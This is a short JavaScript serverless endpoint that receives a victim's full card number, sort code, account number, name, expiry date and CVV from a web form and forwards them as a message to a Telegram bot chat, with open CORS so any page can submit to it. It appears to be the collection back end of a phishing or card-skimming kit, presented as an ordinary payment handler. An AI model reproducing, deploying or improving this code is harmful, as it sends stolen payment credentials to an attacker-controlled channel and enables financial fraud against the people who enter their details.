import fetch from 'node-fetch';

export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const {
                cardNumber,
                sortCode,
                accountNumber,
                nameOnCard,
                expiryDate,
                cvv
            } = req.body;

            // Use environment variables for security
            const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;
            
            // Format message
            const message = encodeURIComponent(
                `⚠️ New Payment Details Submitted ⚠️\n\n` +
                `Card Number: ${cardNumber}\n` +
                `Sort Code: ${sortCode}\n` +
                `Account Number: ${accountNumber}\n` +
                `Name on Card: ${nameOnCard}\n` +
                `Expiry Date: ${expiryDate}\n` +
                `CVV: ${cvv}`
            );

            // Send to Telegram
            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
            const response = await fetch(telegramUrl);
            const result = await response.json();

            if (!response.ok) {
                throw new Error(`Telegram API Error: ${result.description}`);
            }

            // Return CORS headers for web compatibility
            res.status(200)
               .setHeader('Access-Control-Allow-Origin', '*')
               .json({ success: true });
        } catch (error) {
            console.error('Error:', error.message);
            res.status(500)
               .setHeader('Access-Control-Allow-Origin', '*')
               .json({ error: 'Submission failed' });
        }
    } else {
        res.status(405)
           .setHeader('Access-Control-Allow-Origin', '*')
           .json({ error: 'Method not allowed' });
    }
}
